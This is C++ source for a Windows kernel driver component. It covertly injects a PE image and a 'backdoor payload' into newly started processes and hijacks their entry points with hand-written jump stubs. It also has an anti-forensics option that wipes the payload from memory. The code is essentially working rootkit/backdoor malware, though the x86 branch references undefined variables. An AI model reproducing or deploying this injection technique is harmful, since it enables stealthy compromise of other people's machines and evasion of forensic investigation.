#include "stdafx.h"

#ifdef _X86_

#define PEB_IMAGE_BASE_OFFEST 0x08

#elif _AMD64_

#define PEB_IMAGE_BASE_OFFEST 0x10

#endif

// defined in driver.cpp
extern "C" ULONG m_SDT_NtProtectVirtualMemory;

extern PVOID m_Payload;
extern ULONG m_PayloadSize;
//--------------------------------------------------------------------------------------
#ifdef _X86_

__declspec(naked) NTSTATUS NTAPI _ZwProtectVirtualMemory(
    HANDLE ProcessHandle,
    PVOID *BaseAddress,
    PSIZE_T NumberOfBytesToProtect,
    ULONG NewAccessProtection,
    PULONG OldAccessProtection)
{
    __asm
    {
        mov     eax, m_SDT_NtProtectVirtualMemory
        inc     eax // fast comare with -1
        jz      _end
        dec     eax

        lea     edx, [esp + 4]
        int     0x2e
        retn    0x14
_end:
        mov     eax, 0xc00000001
        retn    0x14
    }
}

#endif // _X86_
//--------------------------------------------------------------------------------------
BOOLEAN InjectIntoStartedProcess(PCLIENT_ID ClientId, PEPROCESS Process, PVOID Data, ULONG DataSize)
{
    BOOLEAN bRet = FALSE;

    KAPC_STATE ApcState;
    KeStackAttachProcess(Process, &ApcState);

    OBJECT_ATTRIBUTES ObjAttr;
    InitializeObjectAttributes(&ObjAttr, NULL, OBJ_KERNEL_HANDLE, NULL, NULL);

    // get handle to the target object
    HANDLE hProcess = NULL;
    NTSTATUS ns = ZwOpenProcess(&hProcess, PROCESS_ALL_ACCESS, &ObjAttr, ClientId);
    if (NT_SUCCESS(ns))
    {                     
        PIMAGE_NT_HEADERS pHeaders = (PIMAGE_NT_HEADERS)RVATOVA(
            Data, ((PIMAGE_DOS_HEADER)Data)->e_lfanew);

        PIMAGE_SECTION_HEADER pSection = (PIMAGE_SECTION_HEADER)RVATOVA(
            &pHeaders->OptionalHeader, pHeaders->FileHeader.SizeOfOptionalHeader);

        PUCHAR Image = NULL;
        ULONG ImageSize = pHeaders->OptionalHeader.SizeOfImage;
        
        // obtain PEB address
        PVOID Peb = PsGetProcessPeb(Process);               
        if (Peb == NULL)
        {
            DbgMsg(__FILE__, __LINE__, __FUNCTION__"() ERROR: _PEB is NULL\n");
            goto _end;
        }

        DbgMsg(__FILE__, __LINE__, __FUNCTION__"(): Peb = "IFMT"\n", Peb);

        // image to inject + payload
        SIZE_T TotalSize = ImageSize + m_PayloadSize;
    
        // allocate user space memory for image and payload
        ns = ZwAllocateVirtualMemory(
            hProcess, (PVOID *)&Image, 0, &TotalSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE
        );
        if (NT_SUCCESS(ns))
        {                                
            memset(Image, 0, TotalSize);

            // copy headers
            memcpy(Image, Data, pHeaders->OptionalHeader.SizeOfHeaders);

            // copy sections of our image
            for (ULONG i = 0; i < pHeaders->FileHeader.NumberOfSections; i += 1)
            {
                memcpy(
                    RVATOVA(Image, pSection->VirtualAddress),
                    RVATOVA(Data, pSection->PointerToRawData),
                    min(pSection->SizeOfRawData, pSection->Misc.VirtualSize)
                );             

                pSection += 1;
            }

            if (m_Payload)
            {
                memcpy(RVATOVA(Image, ImageSize), m_Payload, m_PayloadSize);

                // save payload address and size
                BACKDOOR_PAYLOAD_INFO(Image)->Offset = ImageSize;
                BACKDOOR_PAYLOAD_INFO(Image)->Size = m_PayloadSize;

#ifdef USE_ANTI_FORENSICS
                
                memset(m_Payload, 0, m_PayloadSize);                
#endif
                // user mode payload injected, we are done now
                m_Payload = NULL;
                m_PayloadSize = 0;
            }
            else
            {
                BACKDOOR_PAYLOAD_INFO(Image)->Offset = 0;
                BACKDOOR_PAYLOAD_INFO(Image)->Size = 0;
            }

            // parse image base relocations
            if (!LdrProcessRelocs(Image, Image))
            {
                DbgMsg(__FILE__, __LINE__, __FUNCTION__"() ERROR: LdrProcessRelocs() fails\n");
                goto _end;
            }

            pSection = (PIMAGE_SECTION_HEADER)RVATOVA(
                &pHeaders->OptionalHeader, pHeaders->FileHeader.SizeOfOptionalHeader);

            // update memory protection for image sections
            for (ULONG i = 0; i < pHeaders->FileHeader.NumberOfSections; i += 1)
            {                
                SIZE_T SectionSize = pSection->Misc.VirtualSize;
                PVOID SectionAddr = RVATOVA(Image, pSection->VirtualAddress);
                ULONG SectionProt = PAGE_READONLY;

                if ((pSection->Characteristics & IMAGE_SCN_MEM_READ) &&
                    (pSection->Characteristics & IMAGE_SCN_MEM_WRITE) &&
                    (pSection->Characteristics & IMAGE_SCN_MEM_EXECUTE))
                {
                    SectionProt = PAGE_EXECUTE_READWRITE;
                }
                else if ((pSection->Characteristics & IMAGE_SCN_MEM_READ) &&
                         (pSection->Characteristics & IMAGE_SCN_MEM_EXECUTE))
                {
                    SectionProt = PAGE_EXECUTE_READ;
                }
                else if ((pSection->Characteristics & IMAGE_SCN_MEM_READ) &&
                         (pSection->Characteristics & IMAGE_SCN_MEM_WRITE))
                {
                    SectionProt = PAGE_READWRITE;
                }

                // set proper memory protection
                ns = _ZwProtectVirtualMemory(
                    hProcess, &SectionAddr, &SectionSize, SectionProt, &SectionProt
                );
                if (!NT_SUCCESS(ns))
                {
                    DbgMsg(__FILE__, __LINE__, "ZwProtectVirtualMemory() ERROR 0x%.8x\n", ns);
                    goto _end;
                }

                pSection += 1;
            } 

            ULONG ImageDataRva = LdrGetProcAddress(Image, "ep_data");
            ULONG ImageEntryRva = LdrGetProcAddress(Image, "ep_entry");            

            if (ImageDataRva > 0 && ImageEntryRva > 0)
            {
                PVOID ImageData = RVATOVA(Image, ImageDataRva);
                PVOID ImageEntry = RVATOVA(Image, ImageEntryRva);                

                DbgMsg(
                    __FILE__, __LINE__, "Library image at address = "IFMT", entry = "IFMT"\n", 
                    Image, ImageEntry
                );

                // get process image base from PEB
                PUCHAR Target = *(PUCHAR *)RVATOVA(Peb, PEB_IMAGE_BASE_OFFEST);

                PIMAGE_NT_HEADERS pHeaders = (PIMAGE_NT_HEADERS)RVATOVA(
                    Target, ((PIMAGE_DOS_HEADER)Target)->e_lfanew);                

                // get entry point address of started process
                PUCHAR TargetEntry = RVATOVA(Target, pHeaders->OptionalHeader.AddressOfEntryPoint);
                
                DbgMsg(
                    __FILE__, __LINE__, "Target image at address = "IFMT", entry = "IFMT"\n", 
                    Target, TargetEntry
                );

                ULONG PageProt = 0;
                PVOID PageAddr = TargetEntry;                
                SIZE_T PageSize = PAGE_SIZE;                            

                // set write protection for process entry point memory page
                ns = _ZwProtectVirtualMemory(
                    hProcess, &PageAddr, &PageSize, PAGE_EXECUTE_READWRITE, &PageProt
                );
                if (NT_SUCCESS(ns))
                {
                    // save old bytes from process entry point
                    memcpy(ImageData, TargetEntry, INJECT_PATCH_SIZE);
#ifdef _X86_
                    // push Entry
                    *(PUCHAR)TargetImageEntry = 0x68;
                    *(PULONG)((PUCHAR)TargetImageEntry + 1) = (ULONG)LibraryImageEntry;
                        
                    // ret
                    *(PUCHAR)((PUCHAR)TargetImageEntry + 5) = 0xc3;                                                
#else _AMD64_
                    // mov  rax, Entry
                    *(PUSHORT)TargetEntry = 0xb848;
                    *(PULONG_PTR)(TargetEntry + 2) = (ULONG_PTR)ImageEntry;
                        
                    // push rax
                    *(PUCHAR)(TargetEntry + 10) = 0x50;
                        
                    // ret
                    *(PUCHAR)(TargetEntry + 11) = 0xc3;
#endif
                    // restore old memory protection
                    ns = _ZwProtectVirtualMemory(
                        hProcess, &PageAddr, &PageSize, PageProt, &PageProt
                    );
                    if (!NT_SUCCESS(ns))
                    {
                        DbgMsg(__FILE__, __LINE__, "ZwProtectVirtualMemory() ERROR 0x%.8x\n", ns);
                    }

                    DbgMsg(__FILE__, __LINE__, __FUNCTION__"() OK, %d bytes at entry point patched\n", INJECT_PATCH_SIZE);

                    bRet = TRUE;
                }
                else
                {
                    DbgMsg(__FILE__, __LINE__, "ZwProtectVirtualMemory() ERROR 0x%.8x\n", ns);
                }
            }
            else
            {
                DbgMsg(__FILE__, __LINE__, __FUNCTION__"() ERROR: Can't find required exports\n");
            }             
        }
        else
        {
            DbgMsg(__FILE__, __LINE__, "ZwAllocateVirtualMemory() ERROR 0x%.8x\n", ns);
        }      
_end:
        ZwClose(hProcess);
    }
    else
    {
        DbgMsg(__FILE__, __LINE__, "ZwOpenProcess() ERROR 0x%.8x\n", ns);
    }

    KeUnstackDetachProcess(&ApcState);

    return bRet;
}
//--------------------------------------------------------------------------------------
// EoF
